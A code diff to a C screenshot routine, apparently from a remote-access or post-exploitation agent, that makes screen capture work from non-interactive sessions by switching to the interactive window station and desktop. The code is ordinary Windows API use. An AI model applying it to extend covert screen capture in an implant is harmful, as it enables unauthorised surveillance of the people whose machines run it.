@@ -1094,6 +1094,12 @@ BOOL WinScreenshot(
     PVOID               BitMapImage = NULL;
     DWORD               BitMapSize  = 0;
 
+    HWINSTA             hOldWinSta  = NULL;
+    HWINSTA             hWinSta     = NULL;
+    HDESK               hOldDesk    = NULL;
+    HDESK               hDesk       = NULL;
+    DWORD               dwThreadId  = 0;
+
     if ( ErrorReason ) *ErrorReason = NULL;
     if ( ErrorCode   ) *ErrorCode   = 0;
 
@@ -1113,6 +1119,50 @@ BOOL WinScreenshot(
     MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
+
+    /*
+     * In non-interactive sessions the process may be attached to a restricted
+     * window station causing GetDC(NULL) to return NULL or block.  Explicitly
+     * open WinSta0\Default and re-bind the thread before any GDI call.
+     * Guard every fn-ptr — if user32 didn't export a symbol the ptr is NULL.
+     */
+    if ( Instance->Win32.OpenWindowStation      &&
+         Instance->Win32.GetProcessWindowStation &&
+         Instance->Win32.SetProcessWindowStation &&
+         Instance->Win32.CloseWindowStation      &&
+         Instance->Win32.GetThreadDesktop        &&
+         Instance->Win32.OpenDesktopA            &&
+         Instance->Win32.SetThreadDesktop        &&
+         Instance->Win32.CloseDesktop ) {
+
+        dwThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
+        hOldWinSta = Instance->Win32.GetProcessWindowStation();
+        hWinSta    = Instance->Win32.OpenWindowStation( "WinSta0", FALSE,
+                         WINSTA_READATTRIBUTES | WINSTA_READSCREEN );
+        if ( hWinSta ) {
+            if ( Instance->Win32.SetProcessWindowStation( hWinSta ) ) {
+                hOldDesk = Instance->Win32.GetThreadDesktop( dwThreadId );
+                hDesk    = Instance->Win32.OpenDesktopA( "Default", 0, FALSE,
+                               DESKTOP_READOBJECTS | GENERIC_READ );
+                if ( hDesk ) {
+                    if ( ! Instance->Win32.SetThreadDesktop( hDesk ) ) {
+                        Instance->Win32.CloseDesktop( hDesk );
+                        hDesk = NULL;
+                        Instance->Win32.SetProcessWindowStation( hOldWinSta );
+                        Instance->Win32.CloseWindowStation( hWinSta );
+                        hWinSta = NULL;
+                    }
+                } else {
+                    Instance->Win32.SetProcessWindowStation( hOldWinSta );
+                    Instance->Win32.CloseWindowStation( hWinSta );
+                    hWinSta = NULL;
+                }
+            } else {
+                Instance->Win32.CloseWindowStation( hWinSta );
+                hWinSta = NULL;
+            }
+        }
+    } /* end: WinSta0/desktop fn-ptr guard */
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
@@ -1208,6 +1258,20 @@ Cleanup:
 
     if ( hDC ) {
         Instance->Win32.ReleaseDC( NULL, hDC );
+    }
+
+    if ( hDesk ) {
+        if ( hOldDesk ) {
+            Instance->Win32.SetThreadDesktop( hOldDesk );
+        }
+        Instance->Win32.CloseDesktop( hDesk );
+    }
+
+    if ( hWinSta ) {
+        if ( hOldWinSta ) {
+            Instance->Win32.SetProcessWindowStation( hOldWinSta );
+        }
+        Instance->Win32.CloseWindowStation( hWinSta );
     }
 
     return ReturnValue;
